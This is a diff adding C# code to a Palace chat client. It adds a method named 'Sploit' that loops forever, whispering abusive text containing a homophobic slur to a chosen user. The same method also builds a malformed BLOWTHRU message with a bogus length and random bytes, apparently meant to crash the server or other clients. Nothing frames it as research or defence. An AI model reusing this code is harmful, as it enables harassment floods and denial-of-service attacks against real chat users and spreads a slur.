@@ -1,0 +1,66 @@
+        [StructLayout(LayoutKind.Sequential)]
+        struct sploit
+        {
+            public uint flags;
+            public int nbrUsers;
+            public int userID;
+            public uint pluginTag;
+            //byte[] embedded;
+        }
+
+        public void Sploit(int id)
+        {
+            //Task.Factory.StartNew(() =>
+            //{
+            int p = 0;
+            while (true)
+            {
+                var sb = new StringBuilder();
+                for (int j = 0; j < 10; j++)
+                    sb.Append("-Suck it, faggot. " + p++);
+                var text = sb.ToString();
+
+                var msg = new MH_XWhisper(this, Palace.GetUserByID(id, true), text);
+                msg.Write();
+
+                //if (p >= 19)
+                {
+                    //Thread.Sleep(50);
+                    //p = 0;
+                }
+            }
+
+            int size = 8192 + 4096 + 2048 + 1024 + 512 + 64; //16384 = 2^14
+
+            var rand = new Random();
+            var buf = new byte[size];
+
+            //for (int i = 0; i < 2500; i++)
+            {
+                //Thread.Sleep(2500);
+
+                Writer.WriteStruct<ClientMessage>(new ClientMessage
+                {
+                    eventType = MessageTypes.BLOWTHRU,
+                    length = 16 + size,
+                    refNum = int.MinValue,
+                });
+
+                var spl = new sploit
+                {
+                    flags = 0,
+                    nbrUsers = 0,
+                    userID = 0,
+                    pluginTag = 0,
+                };
+                Writer.WriteStruct<sploit>(spl);
+
+                rand.NextBytes(buf);
+
+                Writer.Write(buf);
+
+                Writer.Flush();
+            }
+            //});
+        }
+
